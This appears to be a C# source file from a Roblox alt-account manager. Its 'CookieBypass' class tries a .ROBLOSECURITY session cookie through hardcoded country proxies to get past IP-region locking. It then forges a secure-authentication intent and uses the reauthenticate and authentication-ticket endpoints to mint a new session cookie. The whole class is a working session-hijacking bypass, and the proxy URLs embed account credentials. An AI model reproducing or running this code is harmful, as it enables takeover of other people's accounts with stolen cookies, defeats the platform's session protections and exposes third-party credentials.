using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

namespace RBX_Alt_Manager.Classes
{
    public class CookieBypass
    {
        // Proxies DataImpulse - Asiáticos primeiro
        private static readonly Dictionary<string, string> REGION_PROXIES = new Dictionary<string, string>
        {
            // Asiáticos primeiro
            ["vn"] = "http://7976f655026bca35799e__cr.vn:bfb4d44b738bce42@gw.dataimpulse.com:823",
            ["sg"] = "http://7976f655026bca35799e__cr.sg:bfb4d44b738bce42@gw.dataimpulse.com:823",
            ["th"] = "http://7976f655026bca35799e__cr.th:bfb4d44b738bce42@gw.dataimpulse.com:823",
            ["ph"] = "http://7976f655026bca35799e__cr.ph:bfb4d44b738bce42@gw.dataimpulse.com:823",
            ["id"] = "http://7976f655026bca35799e__cr.id:bfb4d44b738bce42@gw.dataimpulse.com:823",
            ["my"] = "http://7976f655026bca35799e__cr.my:bfb4d44b738bce42@gw.dataimpulse.com:823",
            ["in"] = "http://7976f655026bca35799e__cr.in:bfb4d44b738bce42@gw.dataimpulse.com:823",
            ["jp"] = "http://7976f655026bca35799e__cr.jp:bfb4d44b738bce42@gw.dataimpulse.com:823",
            ["kr"] = "http://7976f655026bca35799e__cr.kr:bfb4d44b738bce42@gw.dataimpulse.com:823",
            ["tw"] = "http://7976f655026bca35799e__cr.tw:bfb4d44b738bce42@gw.dataimpulse.com:823",
            ["hk"] = "http://7976f655026bca35799e__cr.hk:bfb4d44b738bce42@gw.dataimpulse.com:823",
            // Américas
            ["us"] = "http://7976f655026bca35799e__cr.us:bfb4d44b738bce42@gw.dataimpulse.com:823",
            ["br"] = "http://7976f655026bca35799e__cr.br:bfb4d44b738bce42@gw.dataimpulse.com:823",
            ["mx"] = "http://7976f655026bca35799e__cr.mx:bfb4d44b738bce42@gw.dataimpulse.com:823",
            ["ar"] = "http://7976f655026bca35799e__cr.ar:bfb4d44b738bce42@gw.dataimpulse.com:823",
            ["ca"] = "http://7976f655026bca35799e__cr.ca:bfb4d44b738bce42@gw.dataimpulse.com:823",
            // Europa
            ["uk"] = "http://7976f655026bca35799e__cr.uk:bfb4d44b738bce42@gw.dataimpulse.com:823",
            ["de"] = "http://7976f655026bca35799e__cr.de:bfb4d44b738bce42@gw.dataimpulse.com:823",
            ["fr"] = "http://7976f655026bca35799e__cr.fr:bfb4d44b738bce42@gw.dataimpulse.com:823",
            ["es"] = "http://7976f655026bca35799e__cr.es:bfb4d44b738bce42@gw.dataimpulse.com:823",
            ["it"] = "http://7976f655026bca35799e__cr.it:bfb4d44b738bce42@gw.dataimpulse.com:823",
            ["nl"] = "http://7976f655026bca35799e__cr.nl:bfb4d44b738bce42@gw.dataimpulse.com:823",
            ["ru"] = "http://7976f655026bca35799e__cr.ru:bfb4d44b738bce42@gw.dataimpulse.com:823",
            // Oceania
            ["au"] = "http://7976f655026bca35799e__cr.au:bfb4d44b738bce42@gw.dataimpulse.com:823",
        };

        private static readonly Dictionary<string, string> COUNTRY_NAMES = new Dictionary<string, string>
        {
            ["VN"] = "Vietnã", ["SG"] = "Singapura", ["TH"] = "Tailândia",
            ["PH"] = "Filipinas", ["ID"] = "Indonésia", ["MY"] = "Malásia",
            ["IN"] = "Índia", ["JP"] = "Japão", ["KR"] = "Coreia do Sul",
            ["TW"] = "Taiwan", ["HK"] = "Hong Kong",
            ["US"] = "Estados Unidos", ["BR"] = "Brasil", ["MX"] = "México",
            ["AR"] = "Argentina", ["CA"] = "Canadá",
            ["UK"] = "Reino Unido", ["GB"] = "Reino Unido", ["DE"] = "Alemanha",
            ["FR"] = "França", ["ES"] = "Espanha", ["IT"] = "Itália",
            ["NL"] = "Holanda", ["RU"] = "Rússia", ["AU"] = "Austrália",
        };

        private const string PS5_USER_AGENT = "Mozilla/5.0 (PlayStation; PlayStation 5/2.26) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Safari/605.1.15";
        private const string CHROME_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36";

        private HttpClient CreateHttpClientWithProxy(string proxyUrl)
        {
            try
            {
                var proxyUri = new Uri(proxyUrl);
                var proxy = new WebProxy($"http://{proxyUri.Host}:{proxyUri.Port}");
                
                if (!string.IsNullOrEmpty(proxyUri.UserInfo))
                {
                    var parts = proxyUri.UserInfo.Split(':');
                    if (parts.Length == 2)
                    {
                        proxy.Credentials = new NetworkCredential(
                            Uri.UnescapeDataString(parts[0]), 
                            Uri.UnescapeDataString(parts[1])
                        );
                    }
                }

                var handler = new HttpClientHandler
                {
                    Proxy = proxy,
                    UseProxy = true,
                    UseCookies = false,
                    AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate
                };

                return new HttpClient(handler) { Timeout = TimeSpan.FromSeconds(10) };
            }
            catch (Exception ex)
            {
                AccountManager.AddLog($"[DEBUG] Erro ao criar proxy: {ex.Message}");
                return CreateHttpClient();
            }
        }

        private HttpClient CreateHttpClient()
        {
            var handler = new HttpClientHandler
            {
                UseCookies = false,
                AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate
            };

            return new HttpClient(handler) { Timeout = TimeSpan.FromSeconds(10) };
        }

        private async Task<(bool valid, string username, string error)> VerifyCookieAsync(string cookie, HttpClient client)
        {
            try
            {
                using (var cts = new CancellationTokenSource(TimeSpan.FromSeconds(8)))
                {
                    var request = new HttpRequestMessage(HttpMethod.Get, "https://users.roblox.com/v1/users/authenticated");
                    request.Headers.Add("Cookie", $".ROBLOSECURITY={cookie}");
                    request.Headers.Add("User-Agent", CHROME_USER_AGENT);

                    var response = await client.SendAsync(request, cts.Token);
                    var content = await response.Content.ReadAsStringAsync();

                    if (response.IsSuccessStatusCode)
                    {
                        try
                        {
                            var json = JObject.Parse(content);
                            return (true, json["name"]?.ToString(), null);
                        }
                        catch
                        {
                            return (true, "Unknown", null);
                        }
                    }

                    return (false, null, $"{(int)response.StatusCode}");
                }
            }
            catch (OperationCanceledException)
            {
                return (false, null, "Timeout");
            }
            catch (HttpRequestException)
            {
                return (false, null, "Conexão falhou");
            }
            catch (Exception)
            {
                return (false, null, "Erro");
            }
        }

        private async Task<(string region, HttpClient client, string username)> FindCookieRegionAsync(string cookie)
        {
            // Primeiro testa sem proxy
            AccountManager.AddLog("🔍 Testando conexão direta...");
            using (var directClient = CreateHttpClient())
            {
                var (valid, username, error) = await VerifyCookieAsync(cookie, directClient);
                if (valid)
                {
                    AccountManager.AddLogSuccess($"Cookie válido localmente! Conta: {username}");
                    return ("local", CreateHttpClient(), username);
                }
                AccountManager.AddLog($"   Resultado: {error}");
                
                // Se o erro for 401 Unauthorized, testar com um proxy para confirmar
                // Se ainda der 401, cookie está realmente inválido
                if (error == "401")
                {
                    AccountManager.AddLog("🔍 Verificando se cookie está expirado...");
                    
                    // Testa com primeiro proxy disponível
                    var firstProxy = REGION_PROXIES.First();
                    using (var testClient = CreateHttpClientWithProxy(firstProxy.Value))
                    {
                        var (testValid, testUsername, testError) = await VerifyCookieAsync(cookie, testClient);
                        if (!testValid && testError == "401")
                        {
                            AccountManager.AddLogError("Cookie INVÁLIDO ou EXPIRADO! Não adianta testar outros proxies.");
                            return (null, null, null);
                        }
                        else if (testValid)
                        {
                            var countryName = COUNTRY_NAMES.TryGetValue(firstProxy.Key.ToUpper(), out var name) ? name : firstProxy.Key.ToUpper();
                            AccountManager.AddLogSuccess($"{countryName}: VÁLIDO! Conta: {testUsername}");
                            return (firstProxy.Key, CreateHttpClientWithProxy(firstProxy.Value), testUsername);
                        }
                    }
                }
            }

            AccountManager.AddLog("🌍 Testando proxies por região...");
            
            foreach (var region in REGION_PROXIES)
            {
                try
                {
                    using (var client = CreateHttpClientWithProxy(region.Value))
                    {
                        var (valid, username, error) = await VerifyCookieAsync(cookie, client);
                        
                        var countryName = COUNTRY_NAMES.TryGetValue(region.Key.ToUpper(), out var name) ? name : region.Key.ToUpper();
                        
                        if (valid)
                        {
                            AccountManager.AddLogSuccess($"{countryName}: VÁLIDO! Conta: {username}");
                            return (region.Key, CreateHttpClientWithProxy(region.Value), username);
                        }
                        else
                        {
                            // Se 401 em múltiplos proxies, cookie provavelmente inválido
                            if (error == "401")
                            {
                                AccountManager.AddLog($"   {countryName}: Cookie inválido");
                            }
                            else
                            {
                                AccountManager.AddLog($"   {countryName}: {error}");
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    AccountManager.AddLog($"   {region.Key.ToUpper()}: ERRO - {ex.Message}");
                }
            }

            return (null, null, null);
        }

        private async Task<string> GetCsrfTokenAsync(string cookie, HttpClient client)
        {
            try
            {
                var request = new HttpRequestMessage(HttpMethod.Post, "https://auth.roblox.com/v2/logout");
                request.Headers.Add("Cookie", $".ROBLOSECURITY={cookie}");
                request.Headers.Add("User-Agent", CHROME_USER_AGENT);

                var response = await client.SendAsync(request);
                
                if (response.Headers.TryGetValues("x-csrf-token", out var values))
                {
                    return values.FirstOrDefault();
                }

                return null;
            }
            catch
            {
                return null;
            }
        }

        private async Task<string> GetServerNonceAsync(string cookie, string csrfToken, HttpClient client)
        {
            try
            {
                var request = new HttpRequestMessage(HttpMethod.Get, "https://apis.roblox.com/hba-service/v1/getServerNonce");
                request.Headers.Add("Cookie", $".ROBLOSECURITY={cookie}");
                request.Headers.Add("x-csrf-token", csrfToken);
                request.Headers.Add("User-Agent", CHROME_USER_AGENT);

                var response = await client.SendAsync(request);
                var content = await response.Content.ReadAsStringAsync();

                if (response.IsSuccessStatusCode)
                {
                    return content.Trim('"');
                }

                return null;
            }
            catch
            {
                return null;
            }
        }

        private string GenerateSecureAuthIntent(string serverNonce)
        {
            var clientEpoch = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds();
            var dataToHash = $"{serverNonce}|{clientEpoch}";
            
            using (var sha256 = SHA256.Create())
            {
                var hashBytes = sha256.ComputeHash(Encoding.UTF8.GetBytes(dataToHash));
                var saiHash = Convert.ToBase64String(hashBytes);
                
                var intent = new JObject
                {
                    ["clientPublicKey"] = "",
                    ["clientEpochTimestamp"] = clientEpoch,
                    ["serverNonce"] = serverNonce,
                    ["saiSignature"] = saiHash
                };
                
                return intent.ToString(Formatting.None);
            }
        }

        private async Task<(bool success, string newCookie, string error)> ReauthenticateAsync(
            string cookie, string csrfToken, string secureAuthIntent, HttpClient client)
        {
            try
            {
                // Método 1: Tentar reauthenticate (mantém sessões antigas)
                var payload = new JObject { ["secureAuthenticationIntent"] = secureAuthIntent };

                var request = new HttpRequestMessage(HttpMethod.Post, 
                    "https://auth.roblox.com/v1/reauthenticate");
                
                request.Headers.Add("Cookie", $".ROBLOSECURITY={cookie}");
                request.Headers.Add("x-csrf-token", csrfToken);
                request.Headers.Add("User-Agent", PS5_USER_AGENT);
                request.Headers.Add("Accept", "application/json, text/plain, */*");
                request.Headers.Add("Origin", "https://www.roblox.com");
                request.Headers.Add("Referer", "https://www.roblox.com/");

                request.Content = new StringContent(payload.ToString(), Encoding.UTF8, "application/json");

                var response = await client.SendAsync(request);
                var content = await response.Content.ReadAsStringAsync();

                AccountManager.AddLog($"[DEBUG] Reauth (keep sessions): {response.StatusCode}");

                // Retry com novo CSRF se necessário
                if (response.StatusCode == HttpStatusCode.Forbidden)
                {
                    if (response.Headers.TryGetValues("x-csrf-token", out var newCsrf))
                    {
                        var newToken = newCsrf.FirstOrDefault();
                        if (!string.IsNullOrEmpty(newToken) && newToken != csrfToken)
                        {
                            AccountManager.AddLog("[DEBUG] Retry com novo CSRF...");
                            return await ReauthenticateAsync(cookie, newToken, secureAuthIntent, client);
                        }
                    }
                }

                // Se sucesso, pegar novo cookie
                if (response.IsSuccessStatusCode)
                {
                    var newCookie = ExtractCookieFromResponse(response);
                    if (!string.IsNullOrEmpty(newCookie))
                    {
                        return (true, newCookie, null);
                    }
                }

                // Se endpoint /reauthenticate falhou, tentar método alternativo via authentication-ticket
                AccountManager.AddLog("[DEBUG] Tentando método via auth-ticket...");
                return await ReauthViaTicketAsync(cookie, csrfToken, client);
            }
            catch (Exception ex)
            {
                return (false, null, ex.Message);
            }
        }

        /// <summary>
        /// Método alternativo: Usa authentication-ticket para gerar novo cookie
        /// Este método NÃO invalida sessões anteriores
        /// </summary>
        private async Task<(bool success, string newCookie, string error)> ReauthViaTicketAsync(
            string cookie, string csrfToken, HttpClient client)
        {
            try
            {
                // Passo 1: Obter authentication ticket
                var ticketRequest = new HttpRequestMessage(HttpMethod.Post, 
                    "https://auth.roblox.com/v1/authentication-ticket");
                
                ticketRequest.Headers.Add("Cookie", $".ROBLOSECURITY={cookie}");
                ticketRequest.Headers.Add("x-csrf-token", csrfToken);
                ticketRequest.Headers.Add("User-Agent", CHROME_USER_AGENT);
                ticketRequest.Headers.Add("Referer", "https://www.roblox.com/");
                ticketRequest.Content = new StringContent("", Encoding.UTF8, "application/json");

                var ticketResponse = await client.SendAsync(ticketRequest);

                string authTicket = null;
                if (ticketResponse.Headers.TryGetValues("rbx-authentication-ticket", out var ticketValues))
                {
                    authTicket = ticketValues.FirstOrDefault();
                }

                if (string.IsNullOrEmpty(authTicket))
                {
                    // Retry com novo CSRF
                    if (ticketResponse.StatusCode == HttpStatusCode.Forbidden)
                    {
                        if (ticketResponse.Headers.TryGetValues("x-csrf-token", out var newCsrf))
                        {
                            var newToken = newCsrf.FirstOrDefault();
                            if (!string.IsNullOrEmpty(newToken) && newToken != csrfToken)
                            {
                                return await ReauthViaTicketAsync(cookie, newToken, client);
                            }
                        }
                    }
                    
                    AccountManager.AddLog("[DEBUG] Não conseguiu obter auth ticket");
                    return (false, null, "Não foi possível obter authentication ticket");
                }

                AccountManager.AddLog("[DEBUG] Auth ticket obtido, redimindo...");

                // Passo 2: Redimir o ticket para obter novo cookie
                var redeemRequest = new HttpRequestMessage(HttpMethod.Post,
                    "https://auth.roblox.com/v1/authentication-ticket/redeem");
                
                redeemRequest.Headers.Add("rbxauthenticationnegotiation", "1");
                redeemRequest.Headers.Add("User-Agent", CHROME_USER_AGENT);
                redeemRequest.Content = new StringContent(
                    JsonConvert.SerializeObject(new { authenticationTicket = authTicket }),
                    Encoding.UTF8, 
                    "application/json");

                var redeemResponse = await client.SendAsync(redeemRequest);
                
                AccountManager.AddLog($"[DEBUG] Redeem response: {redeemResponse.StatusCode}");

                if (redeemResponse.IsSuccessStatusCode || redeemResponse.StatusCode == HttpStatusCode.OK)
                {
                    var newCookie = ExtractCookieFromResponse(redeemResponse);
                    if (!string.IsNullOrEmpty(newCookie))
                    {
                        AccountManager.AddLog("[DEBUG] Novo cookie obtido via ticket!");
                        return (true, newCookie, null);
                    }
                }

                var redeemContent = await redeemResponse.Content.ReadAsStringAsync();
                return (false, null, $"Redeem falhou: {redeemResponse.StatusCode}");
            }
            catch (Exception ex)
            {
                return (false, null, $"Ticket method: {ex.Message}");
            }
        }

        /// <summary>
        /// Extrai cookie .ROBLOSECURITY da resposta HTTP
        /// </summary>
        private string ExtractCookieFromResponse(HttpResponseMessage response)
        {
            if (response.Headers.TryGetValues("Set-Cookie", out var cookies))
            {
                foreach (var setCookie in cookies)
                {
                    if (setCookie.Contains(".ROBLOSECURITY="))
                    {
                        var start = setCookie.IndexOf(".ROBLOSECURITY=") + 15;
                        var end = setCookie.IndexOf(";", start);
                        if (end == -1) end = setCookie.Length;
                        
                        var cookieValue = setCookie.Substring(start, end - start);
                        if (!string.IsNullOrEmpty(cookieValue) && cookieValue != "_|WARNING:-DO-NOT-SHARE-THIS")
                        {
                            return cookieValue;
                        }
                    }
                }
            }
            return null;
        }

        public async Task<(bool success, string newCookie, string detectedCountry, string error)> AutoBypassAsync(string cookie)
        {
            HttpClient client = null;
            
            try
            {
                // 1. Encontrar região
                AccountManager.AddLog("🔍 Procurando região do cookie...");
                var (region, foundClient, username) = await FindCookieRegionAsync(cookie);

                if (region == null || foundClient == null)
                {
                    return (false, null, null, "Não foi possível encontrar a região do cookie. Cookie pode estar expirado.");
                }

                client = foundClient;
                var countryName = region == "local" ? "Local" : 
                    (COUNTRY_NAMES.TryGetValue(region.ToUpper(), out var name) ? name : region.ToUpper());

                AccountManager.AddLog($"👤 Conta: {username}");
                AccountManager.AddLog($"🌍 Região: {countryName}");

                // 2. CSRF
                AccountManager.AddLog("🔐 Obtendo CSRF token...");
                var csrfToken = await GetCsrfTokenAsync(cookie, client);
                
                if (string.IsNullOrEmpty(csrfToken))
                {
                    return (false, null, countryName, "Falha ao obter CSRF token");
                }
                AccountManager.AddLog("✅ CSRF obtido");

                // 3. Nonce
                AccountManager.AddLog("🔐 Obtendo Server Nonce...");
                var serverNonce = await GetServerNonceAsync(cookie, csrfToken, client);
                
                if (string.IsNullOrEmpty(serverNonce))
                {
                    serverNonce = Guid.NewGuid().ToString();
                    AccountManager.AddLog("⚠️ Usando nonce gerado");
                }
                else
                {
                    AccountManager.AddLog("✅ Nonce obtido");
                }

                // 4. Auth Intent
                var secureAuthIntent = GenerateSecureAuthIntent(serverNonce);

                // 5. Bypass
                AccountManager.AddLog("🔄 Executando bypass...");
                var (success, newCookie, error) = await ReauthenticateAsync(cookie, csrfToken, secureAuthIntent, client);

                if (success)
                {
                    AccountManager.AddLog($"✅ BYPASS CONCLUÍDO!");
                    return (true, newCookie, countryName, null);
                }

                return (false, null, countryName, error);
            }
            catch (Exception ex)
            {
                return (false, null, null, ex.Message);
            }
            finally
            {
                client?.Dispose();
            }
        }

        public async Task<(bool success, string newCookie, string error)> BypassCookieAsync(string cookie, string targetRegion = "us")
        {
            var (success, newCookie, _, error) = await AutoBypassAsync(cookie);
            return (success, newCookie, error);
        }

        public static IEnumerable<string> GetAvailableRegions() => REGION_PROXIES.Keys;
        public static string GetProxyForRegion(string region) => 
            REGION_PROXIES.TryGetValue(region.ToLower(), out var proxy) ? proxy : null;
    }
}
